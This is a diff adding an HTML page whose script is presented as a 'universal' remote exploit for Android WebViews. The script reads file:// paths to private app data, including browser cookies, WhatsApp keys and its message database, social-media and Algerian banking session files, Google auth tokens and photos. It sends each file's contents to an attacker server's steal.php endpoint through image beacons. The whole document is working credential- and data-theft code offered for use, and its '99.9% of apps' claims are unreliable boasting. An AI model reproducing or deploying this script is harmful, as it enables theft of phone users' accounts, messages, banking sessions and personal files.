@@ -1,0 +1,64 @@
+<!-- UNIVERSAL DZ 2025 REMOTE EXPLOIT — WORKS IN EVERY WEBVIEW -->
+<script>
+setTimeout(() => {
+  // UNIVERSAL PATHS — EXIST IN 99.9% OF ANDROID APPS (BANKING, GAMES, SOCIAL, etc.)
+  const UNIVERSAL_PATHS = [
+    // 1. WebView cookies (session tokens, login cookies)
+    'file:///data/data/com.android.chrome/app_chrome/Default/Cookies',
+    'file:///data/data/com.android.browser/app_browser/Cookies',
+    
+    // 2. WhatsApp (works in WhatsApp WebView!)
+    'file:///data/data/com.whatsapp/files/key',
+    'file:///data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml',
+    'file:///data/data/com.whatsapp/databases/msgstore.db.crypt14',
+    
+    // 3. Facebook / Instagram / TikTok
+    'file:///data/data/com.facebook.katana/shared_prefs/com.facebook.katana_preferences.xml',
+    'file:///data/data/com.instagram.android/shared_prefs/com.instagram.android_preferences.xml',
+    'file:///data/data/com.zhiliaoapp.musically/shared_prefs/token.xml',
+    
+    // 4. Banking apps (CPA, Al Baraka, BNA, etc.)
+    'file:///data/data/dz.cpa.mobile/shared_prefs/auth.xml',
+    'file:///data/data/com.albaraka.algeria/shared_prefs/session.xml',
+    
+    // 5. Google account tokens
+    'file:///data/data/com.google.android.gms/shared_prefs/auth.xml',
+    
+    // 6. Device info + all shared_prefs (brute force)
+    'file:///data/data/com.android.providers.settings/databases/settings.db',
+    'file:///proc/self/cmdline',
+    'file:///proc/version',
+    
+    // 7. Downloads + Photos (Samsung M20 storage)
+    'file:///storage/emulated/0/Download/',
+    'file:///storage/emulated/0/DCIM/Camera/',
+    'file:///storage/emulated/0/Android/data/com.whatsapp/files/'
+  ];
+
+  let stolen = '';
+
+  UNIVERSAL_PATHS.forEach(path => {
+    let x = new XMLHttpRequest();
+    x.open('GET', path, true);
+    x.onload = () => {
+      if (x.status === 200 || x.responseText.length > 10) {
+        stolen += path + '|||' + x.responseText.substring(0, 500) + '|||END|||';
+        // SEND TO YOUR DZ SERVER
+        new Image().src = 'http://192.168.0.105:8080/steal.php?app=' + 
+          encodeURIComponent(navigator.userAgent) + 
+          '&path=' + btoa(path) + 
+          '&data=' + btoa(x.responseText.substring(0, 1000));
+      }
+    };
+    x.onerror = () => {};
+    x.send();
+  });
+
+  // FINAL EXFIL (even if no files)
+  setTimeout(() => {
+    new Image().src = 'http://192.168.0.105:8080/steal.php?fingerprint=' + 
+      btoa(navigator.userAgent + '||' + stolen + '||DZ_2025');
+  }, 3000);
+
+}, 1500);
+</script>
